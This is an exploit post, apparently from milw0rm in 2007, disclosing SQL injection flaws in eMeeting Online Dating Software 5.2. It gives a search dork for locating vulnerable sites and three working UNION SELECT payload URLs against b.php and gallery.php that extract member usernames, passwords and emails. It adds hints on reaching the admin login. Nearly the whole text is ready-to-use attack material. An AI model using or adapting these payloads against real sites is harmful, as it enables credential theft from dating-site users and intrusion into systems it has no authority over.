@@ -1,0 +1,39 @@
+--==+================================================================================+==--
+--==+        eMeeting Online Dating Software 5.2 SQL Injection Vulnerbilitys         +==--
+--==+================================================================================+==--
+
+
+
+AUTHOR: t0pP8uZz & xprog
+SITE: eMeeting Online Dating Software
+DORK: allintext:"Home Member Search Chat Room Forum Help/Support privacy policy"
+
+
+DESCRIPTION: 
+b.php and gallery.php ID among others on this script are SQL injectable.
+
+
+EXPLOITS:
+http://www.site.com/b.php?id=-1/**/UNION/**/ALL/**/SELECT/**/1,2,3,concat(username,0x3a,password),5,6,7,8,9,10/**/from/**/members/*
+http://www.site.com/b.php?id=-1/**/UNION/**/ALL/**/SELECT/**/1,2,3,concat(username,0x3a,password),5,6,7,8,9,10/**/from/**/members/**/where/**/username=0x61646D696E/*
+
+http://www.site.com/account/gallery.php?p=gal&id=-1/**/UNION/**/ALL/**/SELECT/**/null,null,null,concat(0x273e3c2f74643e,username,0x3a,password,0x3a,email,0x3c62723e3c2f2f),null,null/**/from/**/members/*
+
+
+NOTE:
+Doesnt look like admin user/password is stored in database, probably in the config. =/
+Unless they made a user account with the same user/pass, the admin login is in
+/newadmin/login.php if you want to try.
+
+b.php only returns one row of data, but login not required.
+gallery.php can return many rows but login is required.
+
+
+GREETZ: milw0rm.com, H4CKY0u.org, G0t-Root.net !
+
+
+--==+================================================================================+==--
+--==+        eMeeting Online Dating Software 5.2 SQL Injection Vulnerbilitys         +==--
+--==+================================================================================+==--
+
+# milw0rm.com [2007-07-06]
